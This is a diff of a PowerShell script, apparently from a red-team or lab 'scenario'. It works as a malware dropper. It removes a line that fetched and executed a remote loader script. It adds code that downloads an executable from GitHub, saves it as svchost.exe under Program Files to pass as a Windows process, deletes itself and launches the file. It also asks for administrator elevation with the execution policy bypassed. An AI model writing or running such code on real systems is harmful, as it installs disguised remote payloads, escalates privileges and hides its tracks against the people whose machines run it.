@@ -1,9 +1,19 @@
-$scriptUrl = "https://raw.githubusercontent.com/Justanother-engineer/scenario4/main/loader.ps1"
 $exeUrl = "https://github.com/Justanother-engineer/scenario4/raw/refs/heads/main/elevcheck.exe"
 $dst = "C:\Program Files\Microsoft\svchost.exe"
 
-if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Start-Process powershell.exe "-NoP -NonI -Exec Bypass -Command `"iex ((New-Object Net.WebClient).DownloadString('$scriptUrl'))`"" -Verb RunAs
+$body = @"
+`$exeUrl = "$exeUrl"
+`$dst = "$dst"
+New-Item -Path "$([System.IO.Path]::GetDirectoryName($dst))" -ItemType Directory -Force | Out-Null
+Invoke-WebRequest -Uri `$exeUrl -OutFile `$dst
+Remove-Item -Path `"`$PSCommandPath`" -Force -ErrorAction SilentlyContinue
+Start-Process -FilePath `$dst
+"@
+
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
+    $tmp = [System.IO.Path]::GetTempFileName() + ".ps1"
+    Set-Content -Path $tmp -Value $body
+    Start-Process powershell.exe "-NoP -NonI -Exec Bypass -File `"$tmp`"" -Verb RunAs
     exit
 }
 
